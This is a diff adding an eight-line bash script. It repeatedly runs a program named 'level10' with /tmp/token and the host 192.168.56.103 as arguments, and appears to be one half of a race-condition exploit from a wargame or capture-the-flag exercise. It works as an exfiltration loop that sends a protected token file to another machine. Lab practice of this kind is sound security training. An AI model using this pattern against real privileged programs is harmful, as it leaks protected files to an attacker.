@@ -1,0 +1,8 @@
+#!/bin/bash
+
+while true
+do
+
+~/./level10 /tmp/token 192.168.56.103
+
+done
